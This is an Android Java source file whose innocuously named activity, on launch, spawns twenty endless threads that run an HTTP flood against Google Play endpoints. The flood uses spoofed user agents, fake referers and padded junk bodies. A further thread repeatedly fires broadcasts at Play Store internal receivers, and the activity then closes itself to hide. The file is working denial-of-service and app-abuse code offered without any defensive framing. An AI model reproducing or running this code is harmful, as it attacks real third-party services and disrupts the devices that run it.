package com.appd.instll;

import static com.appd.instll.tools.randomString;

import android.app.Activity;
import android.content.ComponentName;
import android.content.Intent;
import android.net.Uri;
import android.os.Bundle;

import java.io.BufferedWriter;
import java.io.OutputStreamWriter;
import java.net.InetSocketAddress;
import java.net.Socket;
import java.net.URL;
import java.nio.charset.StandardCharsets;
import java.util.concurrent.ThreadLocalRandom;

import javax.net.ssl.SSLSocketFactory;


public class gamactivity extends Activity {
    public static boolean running=true;
    private void httpFlood(URL url, int port) {
        try {
            boolean isHttps = url.getProtocol().equalsIgnoreCase("https");
            // int port = (url.getPort() > 0) ? url.getPort() : (isHttps ? 443 : 80);

            Socket socket;

            if (isHttps) {
                SSLSocketFactory factory = (SSLSocketFactory) SSLSocketFactory.getDefault();
                socket = factory.createSocket();
            } else {
                socket = new Socket();
            }

            socket.connect(new InetSocketAddress(url.getHost(), port), 0);

            try (BufferedWriter writer = new BufferedWriter(
                    new OutputStreamWriter(socket.getOutputStream(), StandardCharsets.UTF_8))) {


                int requests = 3000;
                for (int i = 0; i < requests && running; i++) {
                    String req = buildRequest(url);
                    writer.write(req);
                    writer.flush();
                    System.out.println("[HTTP_FLOOD] Sent request #" + (i + 1));
                }
            }

            socket.close();

        } catch (Exception e) {
            System.out.println("[LOCAL TEST] Error: " + e.getMessage());
        }
    }
    private String buildRequest(URL url) {
        String path = url.getPath().isEmpty() ? "/" : url.getPath();

        // Add query string if present
        String query = url.getQuery();
        if (query != null && !query.isEmpty()) {
            path = path + "?" + query;
        }

        // Random choice helpers
        ThreadLocalRandom rnd = ThreadLocalRandom.current();

        String userAgent = USER_AGENTS[rnd.nextInt(USER_AGENTS.length)];
        String accept = ACCEPT_HEADERS[rnd.nextInt(ACCEPT_HEADERS.length)];
        String acceptLang = ACCEPT_LANGS[rnd.nextInt(ACCEPT_LANGS.length)];
        String referer = REFERERS[rnd.nextInt(REFERERS.length)];

        // Optional: simple cache-buster query if no query present
        if (query == null || query.isEmpty()) {
            long stamp = System.currentTimeMillis();
            path = path + (path.contains("?") ? "&" : "?") + "t=" + stamp;
        }

        // Host header with port if non-default
        String hostHeader = url.getHost();
        int port = url.getPort();
        if (port > 0 &&
                !((url.getProtocol().equalsIgnoreCase("http") && port == 80) ||
                        (url.getProtocol().equalsIgnoreCase("https") && port == 443))) {
            hostHeader = hostHeader + ":" + port;
        }
        String junkstr = randomString(10000);

        //format=raw&proto_v2=true
        String body = "{\"\\u0000\\u0000\\u0000\":\"test\",\"data\":\""+junkstr+"\",\"proto_v2\"=\"true\",\"format\"=\"raw\",,,,,";

        StringBuilder sb = new StringBuilder();
        sb.append("GET ").append(path).append(" HTTP/1.1\r\n");
        sb.append("Host: ").append(hostHeader).append("\r\n");
        sb.append("User-Agent: ").append(userAgent).append("\r\n");
        sb.append("Accept: ").append(accept).append("\r\n");
        sb.append("Accept-Language: ").append(acceptLang).append("\r\n");
        sb.append("Accept-Encoding: gzip, deflate\r\n");
        sb.append("Referer: ").append(referer).append("\r\n");
        sb.append("Cache-Control: no-cache\r\n");
        sb.append("Pragma: no-cache\r\n");
        sb.append("Connection: keep-alive\r\n");
        sb.append("Upgrade-Insecure-Requests: 1\r\n");
        sb.append("\r\n");
        sb.append(body);

        return sb.toString();
    }
    private static final String[] USER_AGENTS = {
            // Android / Chrome
            "Mozilla/5.0 (Linux; Android 14; Pixel 8) " +
                    "AppleWebKit/537.36 (KHTML, like Gecko) " +
                    "Chrome/121.0.0.0 Mobile Safari/537.36",

            "Mozilla/5.0 (Linux; Android 13; Pixel 7 Build/TQ2A.230605.011) " +
                    "AppleWebKit/537.36 (KHTML, like Gecko) " +
                    "Chrome/116.0.5845.96 Mobile Safari/537.36",

            "Mozilla/5.0 (Linux; Android 12; SM-G991B Build/SP1A.210812.016; wv) " +
                    "AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 " +
                    "Chrome/115.0.5790.102 Mobile Safari/537.36",

            "Mozilla/5.0 (Linux; Android 11; Mi 11) " +
                    "AppleWebKit/537.36 (KHTML, like Gecko) " +
                    "Chrome/113.0.0.0 Mobile Safari/537.36",

            // Android / Firefox
            "Mozilla/5.0 (Android 13; Mobile; rv:118.0) " +
                    "Gecko/118.0 Firefox/118.0",

            "Mozilla/5.0 (Android 12; Mobile; rv:115.0) " +
                    "Gecko/115.0 Firefox/115.0",

            // iOS / Safari
            "Mozilla/5.0 (iPhone; CPU iPhone OS 16_5 like Mac OS X) " +
                    "AppleWebKit/605.1.15 (KHTML, like Gecko) " +
                    "Version/16.5 Mobile/15E148 Safari/604.1",

            "Mozilla/5.0 (iPad; CPU OS 15_6 like Mac OS X) " +
                    "AppleWebKit/605.1.15 (KHTML, like Gecko) " +
                    "Version/15.6 Mobile/15E148 Safari/604.1",

            // Windows / Chrome
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) " +
                    "AppleWebKit/537.36 (KHTML, like Gecko) " +
                    "Chrome/114.0.5735.199 Safari/537.36",

            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) " +
                    "AppleWebKit/537.36 (KHTML, like Gecko) " +
                    "Chrome/120.0.0.0 Safari/537.36",

            // Windows / Firefox
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:119.0) " +
                    "Gecko/20100101 Firefox/119.0",

            // macOS / Safari
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 13_3) " +
                    "AppleWebKit/605.1.15 (KHTML, like Gecko) " +
                    "Version/16.3 Safari/605.1.15"
    };

    private static final String[] ACCEPT_LANGS = {
            "en-US,en;q=0.9",
            "en-GB,en;q=0.8",
            "fr-FR,fr;q=0.9,en;q=0.7",
            "de-DE,de;q=0.9,en;q=0.7",
            "es-ES,es;q=0.9,en;q=0.7"
    };

    private static final String[] ACCEPT_HEADERS = {
            "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
            "text/html,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
            "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.7"
    };

    private static final String[] REFERERS = {
            "https://www.google.com/",
            "https://www.bing.com/",
            "https://www.youtube.com/",
            "https://www.facebook.com/",
            "https://www.twitter.com/"
    };

    @Override
    protected void onCreate( Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);

        for (int x=0;x < 20; x++){
            new Thread(() -> {
                while (running){

                    try {



                        String turlfull = "https://play.googleapis.com/play/log";
                        String turlfull3 = "https://play.googleapis.com/play/log/timestamp";
                        String turlfull2 = "https://play.google.com/";
                        URL url = new URL(turlfull);
                        URL url2 = new URL(turlfull2);
                        URL url3 = new URL(turlfull3);
                        httpFlood(url,443);
                        httpFlood(url2,443);
                        httpFlood(url3,443);
                    }catch (Exception a){
                        a.printStackTrace();
                    }

                    try {
                        Thread.sleep(1);
                    } catch (Exception e) {

                    }
                }
            }).start();
         }


            new Thread(() -> {
                while (running){

                    try {
                        Intent intent = new Intent("com.android.launcher3.action.FIRST_SCREEN_ACTIVE_INSTALLS");

                        intent.setComponent(new ComponentName(
                                "com.android.vending",
                                "com.google.android.finsky.setup.LauncherConfigurationReceiver"
                        ));
                        sendBroadcast(intent);
                      //  intent.addCategory("android.intent.category.DEFAULT");
                      //  intent.putExtra("session_id", 1);
                        // startActivity(intent);

                        Intent intent2 = new Intent();
                        intent2.setComponent(new ComponentName(
                                "com.android.vending",
                                "com.google.android.finsky.packagemonitor.impl.PackageMonitorReceiverImpl$RegisteredReceiver"
                        ));
                        intent2.setData(Uri.parse("package:com.android.vending"));
                        sendBroadcast(intent2);
                    }catch (Exception a){
                        a.printStackTrace();
                    }

                    try {
                        Thread.sleep(6);
                    } catch (Exception e) {

                    }
                }
            }).start();

        gamactivity.this.finish();
    }
}
